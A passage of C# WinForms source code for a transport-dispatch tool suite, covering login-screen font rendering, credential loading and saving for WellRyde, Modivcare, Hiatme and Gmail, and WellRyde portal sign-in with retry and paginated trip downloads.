                                gb.SmoothingMode = SmoothingMode.AntiAlias;
                                gb.PixelOffsetMode = PixelOffsetMode.HighQuality;
                                gb.TextRenderingHint = TextRenderingHint.AntiAliasGridFit;

                                float lx = layerPad;
                                float ly = layerPad;
                                float lRestY = layerPad + relRestY;
                                float lRestX = layerPad + szR.Width + gapBetweenLetters;

                                using (var outline = new SolidBrush(Color.FromArgb(252, 0, 0, 0)))
                                using (var fill = new SolidBrush(Color.FromArgb(232, 168, 12, 24)))
                                {
                                    for (int dy = -2; dy <= 2; dy++)
                                    {
                                        for (int dx = -2; dx <= 2; dx++)
                                        {
                                            if (dx == 0 && dy == 0)
                                                continue;
                                            DrawMirroredROn(gb, lx + dx, ly + dy, outline);
                                            gb.DrawString(rest, _revampFontRest, outline, lRestX + dx, lRestY + dy, format);
                                        }
                                    }

                                    DrawMirroredROn(gb, lx, ly, fill);
                                    gb.DrawString(rest, _revampFontRest, fill, lRestX, lRestY, format);
                                }
                            }

                            float destX = x - layerPad;
                            float destY = y - layerPad;
                            var imgState = g.Save();
                            try
                            {
                                g.InterpolationMode = InterpolationMode.NearestNeighbor;
                                g.PixelOffsetMode = PixelOffsetMode.Half;
                                g.CompositingMode = CompositingMode.SourceOver;
                                g.CompositingQuality = CompositingQuality.HighQuality;
                                g.DrawImage(layer, destX, destY);
                            }
                            finally
                            {
                                g.Restore(imgState);
                            }
                        }

                        g.TextRenderingHint = hintRestore;
                    }
                }
            }
            catch
            {
                // ignore revamp paint failures
            }

            try
            {
                DrawLoginWatermarkOnPictureBox(e.Graphics, pb);
            }
            catch
            {
                // ignore watermark paint failures
            }
        }

        private void EnsureRevampLoginFontsLoaded()
        {
            lock (_revampFontLock)
            {
                if (_revampFontLoadAttempted)
                    return;
                _revampFontLoadAttempted = true;

                PrivateFontCollection trialCollection = null;
                IntPtr embeddedMem = IntPtr.Zero;
                try
                {
                    // Prefer font file beside the EXE (not embedded): keeps the main assembly smaller and avoids PE changes that correlate with Smart App Control blocks.
                    string baseDir = AppDomain.CurrentDomain.BaseDirectory ?? "";
                    string exeDir = Path.GetDirectoryName(Application.ExecutablePath) ?? baseDir;
                    string found = FindRevampDisplayFontFile(baseDir)
                        ?? FindRevampDisplayFontFile(exeDir);

                    if (found != null)
                    {
                        trialCollection = new PrivateFontCollection();
                        trialCollection.AddFontFile(found);
                        if (trialCollection.Families.Length == 0)
                        {
                            trialCollection.Dispose();
                            trialCollection = null;
                        }
                    }

                    if (trialCollection != null)
                    {
                        if (TryCreateRevampFontsFromPrivateCollection(trialCollection, ref embeddedMem))
                            return;
                    }

                    trialCollection?.Dispose();
                    trialCollection = null;

                    if (TryGetEmbeddedRevampFontCollection(out trialCollection, out embeddedMem))
                    {
                        if (TryCreateRevampFontsFromPrivateCollection(trialCollection, ref embeddedMem))
                            return;
                    }

                    trialCollection?.Dispose();
                    trialCollection = null;
                    if (embeddedMem != IntPtr.Zero)
                    {
                        Marshal.FreeCoTaskMem(embeddedMem);
                        embeddedMem = IntPtr.Zero;
                    }
                }
                catch
                {
                    trialCollection?.Dispose();
                    if (embeddedMem != IntPtr.Zero)
                    {
                        Marshal.FreeCoTaskMem(embeddedMem);
                        embeddedMem = IntPtr.Zero;
                    }
                }

                _revampFontLargeR = new Font("Impact", 262f, FontStyle.Bold, GraphicsUnit.Pixel);
                _revampFontRest = new Font("Impact", 118f, FontStyle.Bold, GraphicsUnit.Pixel);
            }
        }

        /// <summary>Loads YouMurderer from an embedded resource (see project Fonts\YouMurdererBB.otf). Caller frees <paramref name="allocatedFontMemory"/> on failure before taking ownership of the collection.</summary>
        private static bool TryGetEmbeddedRevampFontCollection(out PrivateFontCollection pfc, out IntPtr allocatedFontMemory)
        {
            pfc = null;
            allocatedFontMemory = IntPtr.Zero;
            var asm = typeof(Form1).Assembly;
            Stream stream = asm.GetManifestResourceStream("Hiatme_Tool_Suite_v3.Fonts.YouMurdererBB.otf");
            if (stream == null)
            {
                foreach (var rn in asm.GetManifestResourceNames())
                {
                    if (!rn.EndsWith(".otf", StringComparison.OrdinalIgnoreCase))
                        continue;
                    if (rn.IndexOf("murderer", StringComparison.OrdinalIgnoreCase) < 0
                        && rn.IndexOf("YouMurderer", StringComparison.OrdinalIgnoreCase) < 0)
                        continue;
                    stream = asm.GetManifestResourceStream(rn);
                    if (stream != null)
                        break;
                }
            }

            if (stream == null)
                return false;

            byte[] buf;
            using (var ms = new MemoryStream())
            using (stream)
            {
                stream.CopyTo(ms);
                buf = ms.ToArray();
            }

            if (buf.Length == 0)
                return false;

            IntPtr ptr = Marshal.AllocCoTaskMem(buf.Length);
            try
            {
                Marshal.Copy(buf, 0, ptr, buf.Length);
                var col = new PrivateFontCollection();
                col.AddMemoryFont(ptr, buf.Length);
                if (col.Families.Length == 0)
                {
                    col.Dispose();
                    Marshal.FreeCoTaskMem(ptr);
                    return false;
                }

                allocatedFontMemory = ptr;
                pfc = col;
                return true;
            }
            catch
            {
                Marshal.FreeCoTaskMem(ptr);
                pfc = null;
                allocatedFontMemory = IntPtr.Zero;
                return false;
            }
        }

        /// <summary>Transfers <paramref name="trialCollection"/> into fields; on success takes ownership of <paramref name="embeddedFontMemory"/> (must not free caller).</summary>
        private bool TryCreateRevampFontsFromPrivateCollection(PrivateFontCollection trialCollection, ref IntPtr embeddedFontMemory)
        {
            Font large = null;
            Font small = null;
            try
            {
                var registeredName = trialCollection.Families[0].Name;
                var fam = new FontFamily(registeredName, trialCollection);
                large = new Font(fam, 320f, FontStyle.Regular, GraphicsUnit.Pixel);
                small = new Font(fam, 140f, FontStyle.Regular, GraphicsUnit.Pixel);
                _revampFontCollection = trialCollection;
                _revampFontLargeR = large;
                _revampFontRest = small;
                large = null;
                small = null;
                if (embeddedFontMemory != IntPtr.Zero)
                {
                    _revampEmbeddedFontAlloc = embeddedFontMemory;
                    embeddedFontMemory = IntPtr.Zero;
                }

                return true;
            }
            catch
            {
                large?.Dispose();
                small?.Dispose();
                return false;
            }
        }

        /// <summary>Locate YouMurderer (or any dropped) display font next to the EXE — FontSpace downloads often use other file names.</summary>
        private static string FindRevampDisplayFontFile(string root)
        {
            if (string.IsNullOrEmpty(root))
                return null;

            string[] fixedNames =
            {
                Path.Combine(root, "Fonts", "YouMurdererBB.otf"),
                Path.Combine(root, "Fonts", "youmurdererbb.otf"),
                Path.Combine(root, "Fonts", "YouMurderer BB.otf"),
                Path.Combine(root, "YouMurdererBB.otf"),
                Path.Combine(root, "youmurdererbb_bb_otf15980.otf"),
            };

            foreach (var p in fixedNames)
            {
                if (File.Exists(p))
                    return p;
            }

            try
            {
                string fontsDir = Path.Combine(root, "Fonts");
                if (!Directory.Exists(fontsDir))
                    return null;

                foreach (var ext in new[] { "*.otf", "*.ttf" })
                {
                    foreach (var path in Directory.GetFiles(fontsDir, ext, SearchOption.TopDirectoryOnly))
                    {
                        var n = Path.GetFileName(path) ?? "";
                        if (n.IndexOf("murderer", StringComparison.OrdinalIgnoreCase) >= 0
                            || n.IndexOf("youmurderer", StringComparison.OrdinalIgnoreCase) >= 0)
                            return path;
                    }
                }

                foreach (var ext in new[] { "*.otf", "*.ttf" })
                {
                    var any = Directory.GetFiles(fontsDir, ext, SearchOption.TopDirectoryOnly);
                    if (any.Length == 1)
                        return any[0];
                }
            }
            catch
            {
                // ignore IO errors
            }

            return null;
        }

        private void DisposeRevampLoginFonts()
        {
            lock (_revampFontLock)
            {
                try
                {
                    _revampFontLargeR?.Dispose();
                    _revampFontRest?.Dispose();
                    _revampFontCollection?.Dispose();
                }
                catch
                {
                    // ignore
                }

                _revampFontLargeR = null;
                _revampFontRest = null;
                _revampFontCollection = null;

                if (_revampEmbeddedFontAlloc != IntPtr.Zero)
                {
                    try
                    {
                        Marshal.FreeCoTaskMem(_revampEmbeddedFontAlloc);
                    }
                    catch
                    {
                        // ignore
                    }

                    _revampEmbeddedFontAlloc = IntPtr.Zero;
                }
            }
        }

        /// <summary>Login handlers can run during InitializeComponent before <see cref="lightImageList"/> images are loaded from the resx.</summary>
        private void SetWrPbLightImage(int imageIndex)
        {
            if (lightImageList?.Images != null && imageIndex >= 0 && imageIndex < lightImageList.Images.Count)
                wrPBLight.Image = lightImageList.Images[imageIndex];
        }

        //LOGIN
        private void loginCB_SelectedIndexChanged(object sender, EventArgs e)
        {
            loginCodeTB.Enabled = false;
            switch (this.loginCB.GetItemText(this.loginCB.SelectedItem))
            {
                case "Wellryde":
                    LoadWRCredentials();
                    if (_wellRydePanelSessionActive) { DisableWRLogin(); }
                    else { EnableWRLogin(); }
                    break;
                case "Modivcare":
                    LoadMCCredentials();
                    if (mcLoginHandler?.Connected == true) { DisableMCLogin(); }
                    else { EnableMCLogin(); }
                    break;
                case "Hiatme":
                    LoadHiatmeCredentials();
                    if (hiatmeLoginHandler?.Connected == true) { DisableHiatmeLogin(); }
                    else { EnableHiatmeLogin(); }
                    break;
                case "Gmail":
                    LoadGmailCredentials();
                    EnableGmailLogin();
                    break;
            }
            UpdateGmailDefaultButtonVisibility();
        }
        private async void loginBtn_Click(object sender, EventArgs e)
        {
            manuallogin = true;
            ShowLoadingGif();
            switch (loginCB.SelectedIndex)
            {
                case 0:
                    if (_wellRydePanelSessionActive)
                    {
                        await SetLoadingGifLabel("WellRyde: signing out…");
                        InvalidateWellRydePortalSession();
                        EnableWRLogin();
                        hidegiftimer.Start();
                    }
                    else
                    {
                        string companycode = (loginCodeTB.Text ?? "").Trim();
                        string username = (loginUserTB.Text ?? "").Trim();
                        string password = loginPassTB.Text ?? "";
                        if (string.IsNullOrEmpty(companycode) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                        {
                            hidegiftimer.Start();
                            MessageBox.Show("Enter company code, username, and password.");
                            return;
                        }
                        string loginErr = await TryWellRydePortalHttpLoginAsync(companycode, username, password);
                        if (loginErr != null)
                        {
                            hidegiftimer.Start();
                            MessageBox.Show(loginErr);
                            return;
                        }
                        _wellRydePanelSessionActive = true;
                        SaveWRCredentials(companycode, username, password);
                        DisableWRLogin();
                        hidegiftimer.Start();
                    }
                    break;
                case 1:
                    if (mcLoginHandler.Connected == true)
                    {
                        await SetLoadingGifLabel("Modivcare: signing out…");
                        await mcLoginHandler.Logout();
                        hidegiftimer.Start();
                    }
                    else
                    {
                        await SetLoadingGifLabel("Logging into Modivcare");
                        await MCLogin();
                    }
                    break;
                case 2:
                    hidegiftimer.Start();
                    break;
                case 3:
                    if (Properties.Settings.Default.gmailUseOfficeDefault
                        && ScheduleBuilderGmailDefaults.IsConfigured())
                    {
                        hidegiftimer.Start();
                        break;
                    }
                    await GmailLoginTestAsync();
                    hidegiftimer.Start();
                    break;
            }
            if (manuallogin)
            {
                manuallogin = false;
            }

        }
        private void LoadWRCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.wrUserName))
            {
                loginCodeTB.Text = Properties.Settings.Default.wrCompanyCode ?? "";
                loginUserTB.Text = Properties.Settings.Default.wrUserName;
                loginPassTB.Text = Properties.Settings.Default.wrUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }

        private void SaveWRCredentials(string code, string user, string pass, bool userInitiatedLogin = true)
        {
            try
            {
                if (loginSwitch.Checked == false)
                {
                    if (userInitiatedLogin)
                    {
                        Properties.Settings.Default.wrCompanyCode = "";
                        Properties.Settings.Default.wrUserName = "";
                        Properties.Settings.Default.wrUserPass = "";
                        Properties.Settings.Default.Save();
                    }
                    return;
                }

                Properties.Settings.Default.wrCompanyCode = code ?? "";
                Properties.Settings.Default.wrUserName = user ?? "";
                Properties.Settings.Default.wrUserPass = pass ?? "";
                Properties.Settings.Default.Save();
            }
            catch
            {
                Console.WriteLine("There was a problem saving WellRyde credentials");
            }
        }

        private void EnableWRLogin()
        {
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = true;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 0;
            loginCB.Focus();
        }

        private void DisableWRLogin()
        {
            SetWrPbLightImage(1);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 0;
        }

        /// <summary>Bootstrap + Spring login + /portal/nu. On failure abandons <see cref="_wellRydeSession"/>.</summary>
        /// <returns><c>null</c> on success; otherwise an error message for the user.</returns>
        private async Task<string> TryWellRydePortalHttpLoginAsync(string companycode, string username, string password)
        {
            WellRydePortalLog.Info("LOGIN", "TryWellRydePortalHttpLoginAsync start (company=" + (companycode ?? "") + ")");
            await SetLoadingGifLabel("Checking connections");
            _wellRydeSession?.Dispose();
            _wellRydeSession = new WellRydePortalSession();
            WellRydePortalBootstrapResult wrBoot;
            try
            {
                wrBoot = await _wellRydeSession.BootstrapMainPageAsync();
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                WellRydePortalLog.Error("LOGIN", "bootstrap failed", ex);
                return "WellRyde portal request failed: " + ex.Message + WellRydePortalLog.UserHintSuffix();
            }
            if (!wrBoot.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                var prefix = wrBoot.StatusCode.HasValue
                    ? "HTTP " + (int)wrBoot.StatusCode.Value + " — "
                    : "";
                WellRydePortalLog.Error("LOGIN", "bootstrap HTTP failed: " + (wrBoot.ErrorMessage ?? ""));
                return prefix + (wrBoot.ErrorMessage ?? "Could not load portal.") + WellRydePortalLog.UserHintSuffix();
            }
            await SetLoadingGifLabel("Signing in to WellRyde");
            WellRydePortalLoginResult wrLogin;
            try
            {
                wrLogin = await _wellRydeSession.LoginSpringSecurityAsync(companycode, username, password);
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return "WellRyde login failed: " + ex.Message;
            }
            if (!wrLogin.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return wrLogin.ErrorMessage ?? "WellRyde login was not accepted.";
            }
            await SetLoadingGifLabel("Loading WellRyde portal…");
            WellRydePortalNuResult wrNu;
            try
            {
                if (!string.IsNullOrWhiteSpace(wrLogin.Location))
                    wrNu = await _wellRydeSession.CompleteLoginNavigationAsync(wrLogin.Location);
                else
                    wrNu = await _wellRydeSession.GetPortalNuAsync();
            }
            catch (Exception ex)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                return "WellRyde /portal/nu failed: " + ex.Message;
            }
            if (!wrNu.IsSuccess)
            {
                _wellRydeSession.Dispose();
                _wellRydeSession = null;
                var nuPrefix = wrNu.StatusCode.HasValue
                    ? "HTTP " + (int)wrNu.StatusCode.Value + " — "
                    : "";
                return nuPrefix + (wrNu.ErrorMessage ?? "Could not load /portal/nu.");
            }

            _wellRydeSession.SyncSnapshotCookiesIntoJar();
            WellRydePortalLog.Info("LOGIN", "TryWellRydePortalHttpLoginAsync OK");
            return null;
        }

        private void InvalidateWellRydePortalSession()
        {
            _wellRydePanelSessionActive = false;
            _wellRydeSession?.Dispose();
            _wellRydeSession = null;
        }

        private static bool WellRydeFilterDataLooksLikeAuthOrSessionFailure(WellRydePortalFilterDataResult r)
        {
            if (r == null || r.IsSuccess)
                return false;
            if (r.StatusCode == HttpStatusCode.Unauthorized || r.StatusCode == HttpStatusCode.Forbidden)
                return true;
            var msg = (r.ErrorMessage ?? "").ToLowerInvariant();
            return msg.Contains("csrf") || msg.Contains("login") || msg.Contains("session") || msg.Contains("sign in");
        }

        /// <summary>Ensures portal session, loads trips, and on auth-like filterdata failure invalidates once and retries so the caller still completes the same action.</summary>
        private async Task<(WellRydePortalFilterDataResult reloadResult, int portalTotalRecords)> ReloadBillingTripsFromPortalWithAuthRetryAsync()
        {
            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                return (WellRydePortalFilterDataResult.Fail(null, "WellRyde portal session is not available."), 0);

            var first = await wrBillingTool.ReloadTripsFromPortalAsync(_wellRydeSession, rjDatePicker1.Value);
            if (first.result.IsSuccess || !WellRydeFilterDataLooksLikeAuthOrSessionFailure(first.result))
                return first;

            InvalidateWellRydePortalSession();
            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                return (WellRydePortalFilterDataResult.Fail(null, "Could not re-authenticate to WellRyde."), 0);

            return await wrBillingTool.ReloadTripsFromPortalAsync(_wellRydeSession, rjDatePicker1.Value);
        }

        /// <summary>
        /// Pulls WellRyde trips for an arbitrary date without touching <see cref="wrBillingTool"/> state, so callers
        /// (e.g. Trip Scout) don't clobber the Billing tab's loaded trip list. Mirrors the auth-retry pattern used by billing,
        /// and pages through <c>/portal/filterdata</c> until the full day is collected — the portal often caps responses
        /// (commonly ~200/page) regardless of <c>maxResult</c>, so iteration is required to actually fetch everything.
        /// </summary>
        private async Task<(WellRydePortalFilterDataResult result, List<WRDownloadedTrip> trips, int portalTotalRecords)>
            LoadWellRydeTripsForDateWithAuthRetryAsync(DateTime date)
        {
            if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                return (WellRydePortalFilterDataResult.Fail(null, "WellRyde portal session is not available."), null, 0);

            WellRydePortalFilterDataResult firstFd;
            try
            {
                firstFd = await _wellRydeSession.PostTripFilterDataAsync(date,
                    maxResults: WellRydePortalSession.DefaultTripFilterMaxResult, page: 1).ConfigureAwait(true);
            }
            catch (Exception ex)
            {
                return (WellRydePortalFilterDataResult.Fail(null, ex.Message ?? "filterdata request failed."), null, 0);
            }

            if (!firstFd.IsSuccess && WellRydeFilterDataLooksLikeAuthOrSessionFailure(firstFd))
            {
                InvalidateWellRydePortalSession();
                if (!await EnsureWellRydePortalSessionForBillingAsync() || _wellRydeSession == null)
                    return (WellRydePortalFilterDataResult.Fail(null, "Could not re-authenticate to WellRyde."), null, 0);

                try
                {
                    firstFd = await _wellRydeSession.PostTripFilterDataAsync(date,
                        maxResults: WellRydePortalSession.DefaultTripFilterMaxResult, page: 1).ConfigureAwait(true);
                }
                catch (Exception ex)
                {
                    return (WellRydePortalFilterDataResult.Fail(null, ex.Message ?? "filterdata request failed."), null, 0);
                }
            }

            if (!firstFd.IsSuccess)
                return (firstFd, null, 0);

            int totalRecords;
            List<WRDownloadedTrip> firstPageTrips;
            try
            {
                firstPageTrips = WellRydeFilterDataParser.ParseTrips(firstFd.JsonBody, out totalRecords);
            }
            catch (Exception ex)
            {
                return (WellRydePortalFilterDataResult.Fail(firstFd.StatusCode,
                    "Failed to parse trip list: " + (ex.Message ?? "unknown error."), firstFd.JsonBody), null, 0);
            }

            firstPageTrips = firstPageTrips ?? new List<WRDownloadedTrip>();
            // Fast path: a single response that already contains the whole day.
            if (totalRecords <= 0 || firstPageTrips.Count >= totalRecords)
                return (firstFd, firstPageTrips, totalRecords);

            // Paginate. We dedupe by TripUUID so a portal that ignores the page parameter (and keeps
            // returning page 1) terminates instead of looping forever.
            var aggregated = new List<WRDownloadedTrip>(totalRecords);
            var seenUuids = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (var t in firstPageTrips)
            {
                string key = !string.IsNullOrEmpty(t.TripUUID) ? t.TripUUID : (t.TripNumber ?? "");
                if (seenUuids.Add(key)) aggregated.Add(t);
            }

            const int MaxPages = 50;
            int pageSize = WellRydePortalSession.DefaultTripFilterMaxResult;
            for (int page = 2; page <= MaxPages && aggregated.Count < totalRecords; page++)
            {
                WellRydePortalFilterDataResult pageFd;
                try
                {
                    pageFd = await _wellRydeSession.PostTripFilterDataAsync(date,
                        maxResults: pageSize, page: page).ConfigureAwait(true);
                }
                catch (Exception)
                {
                    // Stop pagination on any network blip; return what we have so far so the user
                    // still sees most of the day rather than nothing.
                    break;
                }

                if (!pageFd.IsSuccess) break;

                List<WRDownloadedTrip> pageTrips;
                int pageTotal;
                try
                {
                    pageTrips = WellRydeFilterDataParser.ParseTrips(pageFd.JsonBody, out pageTotal);
                }
                catch
                {
                    break;
                }
                if (pageTotal > totalRecords) totalRecords = pageTotal;

                if (pageTrips == null || pageTrips.Count == 0) break;

                int addedThisPage = 0;
                foreach (var t in pageTrips)
                {
                    string key = !string.IsNullOrEmpty(t.TripUUID) ? t.TripUUID : (t.TripNumber ?? "");
                    if (seenUuids.Add(key))
                    {
                        aggregated.Add(t);
                        addedThisPage++;
                    }
                }
                // No new rows means the portal is ignoring our page param (or recycling page 1) —
                // bail before we spin forever.
                if (addedThisPage == 0) break;
            }

            return (firstFd, aggregated, totalRecords);
        }

        /// <summary>On-screen WR login fields when filled; otherwise remembered credentials from settings.</summary>
        private bool TryGetWellRydeCredentials(out string companycode, out string username, out string password)
        {
            companycode = "";
            username = "";
            password = "";

            if (loginCB.SelectedIndex == 0)
            {
                companycode = (loginCodeTB.Text ?? "").Trim();
                username = (loginUserTB.Text ?? "").Trim();
                password = loginPassTB.Text ?? "";
            }

            if (string.IsNullOrEmpty(companycode))
                companycode = (Properties.Settings.Default.wrCompanyCode ?? "").Trim();
            if (string.IsNullOrEmpty(username))
                username = (Properties.Settings.Default.wrUserName ?? "").Trim();
            if (string.IsNullOrEmpty(password))
                password = Properties.Settings.Default.wrUserPass ?? "";

            return !string.IsNullOrEmpty(companycode)
                && !string.IsNullOrEmpty(username)
                && !string.IsNullOrEmpty(password);
        }

        /// <summary>For billing and tools: probe an existing session with /portal/nu; if stale, re-login then return. Uses saved or on-screen WellRyde credentials.</summary>
        private async Task<bool> EnsureWellRydePortalSessionForBillingAsync(bool showMessageIfNoCredentials = true)
        {
            if (_wellRydePanelSessionActive && _wellRydeSession != null)
            {
                await SetLoadingGifLabel("Checking connections");
                bool nuOk = false;
                try
                {
                    var nu = await _wellRydeSession.GetPortalNuAsync().ConfigureAwait(true);
                    nuOk = nu.IsSuccess && _wellRydeSession.IsPortalNuPageAuthenticated();
                }
                catch
                {
                    nuOk = false;
                }
                if (nuOk)
                {
                    await SetLoadingGifLabel("WellRyde: already signed in");
                    return true;
                }
                InvalidateWellRydePortalSession();
            }

            if (!TryGetWellRydeCredentials(out string companycode, out string username, out string password))
            {
                await SetLoadingGifLabel("Checking connections");
                if (showMessageIfNoCredentials)
                {
                    MessageBox.Show(
                        "WellRyde is not signed in. Use the Login bar (WellRyde), or save credentials with Remember credentials.");
                }
                return false;
            }

            string err = await TryWellRydePortalHttpLoginAsync(companycode, username, password);
            if (err != null)
            {
                MessageBox.Show(err);
                return false;
            }
            _wellRydePanelSessionActive = true;
            return true;
        }

        /// <summary>Supey driver save: auto-login when possible; otherwise prompt and switch to WellRyde login UI.</summary>
        private async Task<bool> EnsureWellRydePortalSessionForSupeyAsync()
        {
            if (_wellRydePanelSessionActive && _wellRydeSession != null)
            {
                try
                {
                    var nu = await _wellRydeSession.GetPortalNuAsync().ConfigureAwait(true);
                    if (nu.IsSuccess && _wellRydeSession.IsPortalNuPageAuthenticated()
                        && _wellRydeSession.HasPortalSessionCookie())
                        return true;
                    InvalidateWellRydePortalSession();
                }
                catch
                {
                    // stale session — re-login below
                }
                InvalidateWellRydePortalSession();
            }

            if (TryGetWellRydeCredentials(out string cc, out string user, out string pass))
            {
                SetSupeyStatus("Signing in to WellRyde…");
                string autoErr = await TryWellRydePortalHttpLoginAsync(cc, user, pass).ConfigureAwait(true);
                if (autoErr == null && _wellRydeSession != null
                    && _wellRydeSession.HasPortalSessionCookie()
                    && _wellRydeSession.IsPortalNuPageAuthenticated())
                {
                    _wellRydePanelSessionActive = true;
                    return true;
                }
                else if (autoErr == null)
                {
                    _wellRydePanelSessionActive = true;
                    return true;
                }
                SetSupeyStatus("WellRyde auto sign-in failed — " + autoErr);
                WellRydePortalLog.CopyErrorReport("WellRyde auto sign-in failed: " + autoErr);
            }

            var dr = MessageBox.Show(this,
                "Saving this driver's profile to WellRyde requires a portal sign-in "
                + "(home address and email sync for other dispatchers).\r\n\r\n"
                + "Sign in to WellRyde now?",
                "WellRyde sign-in",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Question,
                MessageBoxDefaultButton.Button1);
            if (dr != DialogResult.Yes)
                return false;

            EnableWRLogin();
            LoadWRCredentials();

            if (!TryGetWellRydeCredentials(out string companycode, out string username, out string password))
            {
                MessageBox.Show(this,
                    "Use the Login bar at the top of the app:\r\n"
                    + "1. Choose WellRyde\r\n"
                    + "2. Enter company code, username, password\r\n"
                    + "3. Check Remember credentials (recommended)\r\n"
                    + "4. Click Login\r\n\r\n"
                    + "Then edit the driver again and click Save.",
                    "Supey — WellRyde",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                return false;
            }

            SetSupeyStatus("Signing in to WellRyde…");
            string err = await TryWellRydePortalHttpLoginAsync(companycode, username, password)
                .ConfigureAwait(true);
            if (err != null)
            {
                WellRydePortalLog.ShowError(this, "WellRyde sign-in failed", err);
                return false;
            }

            _wellRydePanelSessionActive = true;
            return _wellRydeSession != null;
        }

        private void RevealPass_Click(object sender, EventArgs e)
        {
            if (loginPassTB.Password == true)
            {
                loginPassTB.Password = false;
            }
            else
            {
                loginPassTB.Password = true;
            }
           
        }
        //Hiatme Login Functions, Handlers etc
        public void InitializeHiatmeLoginHandler()
        {
            hiatmeLoginHandler = new HiatmeLoginHandler();
        }
        private void LoadHiatmeCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.hiatmeUserName))
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = Properties.Settings.Default.hiatmeUserName;
                loginPassTB.Text = Properties.Settings.Default.hiatmeUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }
        private void EnableHiatmeLogin()
        {
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 2;
            loginCB.Focus();
        }
        private void DisableHiatmeLogin()
        {
            SetWrPbLightImage(1);
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 2;
        }

        private void LoadGmailCredentials()
        {
            loginCodeTB.Text = "Not Applicable";

            if (Properties.Settings.Default.gmailUseOfficeDefault
                && ScheduleBuilderGmailDefaults.TryGet(out string officeAddress, out _))
            {
                ApplyGmailOfficeDefaultUi(officeAddress);
                return;
            }

            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;

            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.gmailUserName))
            {
                loginUserTB.Text = Properties.Settings.Default.gmailUserName;
                loginPassTB.Text = Properties.Settings.Default.gmailUserPass ?? string.Empty;
                loginSwitch.Checked = true;
                SetWrPbLightImage(1);
            }
            else
            {
                loginUserTB.Text = string.Empty;
                loginPassTB.Text = string.Empty;
                loginSwitch.Checked = false;
                SetWrPbLightImage(0);
            }
        }

        private void ApplyGmailOfficeDefaultUi(string officeAddress)
        {
            loginUserTB.Text = officeAddress ?? string.Empty;
            loginPassTB.Text = string.Empty;
            loginPassTB.Enabled = false;
            // Do not touch loginSwitch.Checked — it is shared with WellRyde/Modivcare/Hiatme.
            loginSwitch.Enabled = false;
            loginBtn.Text = "Ready";
            loginBtn.Enabled = false;
            SetWrPbLightImage(1);
        }

        private void EnableGmailLogin()
        {
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginBtn.Text = "Test my Gmail";
            loginCB.SelectedIndex = 3;

            if (Properties.Settings.Default.gmailUseOfficeDefault
                && ScheduleBuilderGmailDefaults.TryGet(out string officeAddress, out _))
            {
                ApplyGmailOfficeDefaultUi(officeAddress);
                UpdateGmailDefaultButtonVisibility();
                return;
            }

            SetWrPbLightImage(0);
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Enabled = true;
            loginBtn.Text = "Test my Gmail";
            UpdateGmailDefaultButtonVisibility();
            loginCB.Focus();
        }

        private void DisableGmailLogin()
        {
            SetWrPbLightImage(1);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Enabled = true;
            loginBtn.Text = "Test my Gmail";
            loginCB.SelectedIndex = 3;
            UpdateGmailDefaultButtonVisibility();
        }

        private void UpdateGmailDefaultButtonVisibility()
        {
            if (materialCard3 == null || loginSwitch == null)
                return;

            bool gmailSelected = loginCB != null && loginCB.SelectedIndex == 3;

            if (gmailDefaultBtn != null)
            {
                gmailDefaultBtn.Visible = gmailSelected;
                if (gmailSelected)
                {
                    bool configured = ScheduleBuilderGmailDefaults.IsConfigured();
                    gmailDefaultBtn.Enabled = configured;
                    gmailDefaultBtn.Text = configured
                        ? "Use office email (default)"
                        : "Office email not configured";

                    int cardW = materialCard3.ClientSize.Width;
                    int btnW = Math.Min(286, Math.Max(180, cardW - 16));
                    gmailDefaultBtn.SetBounds((cardW - btnW) / 2, 261, btnW, 36);
                }
            }

            loginSwitch.Location = new Point(
                loginSwitch.Location.X,
                gmailSelected ? 304 : 266);

            materialCard3.Size = new Size(
                materialCard3.Width,
                gmailSelected ? 354 : 318);

            if (materialCard2 != null)
            {
                materialCard2.Location = new Point(
                    materialCard2.Location.X,
                    gmailSelected ? 420 : 386);
            }

            if (loginPanel != null)
            {
                loginPanel.Size = new Size(
                    loginPanel.Width,
                    gmailSelected ? 494 : 458);
            }
        }

        private void gmailDefaultBtn_Click(object sender, EventArgs e)
        {
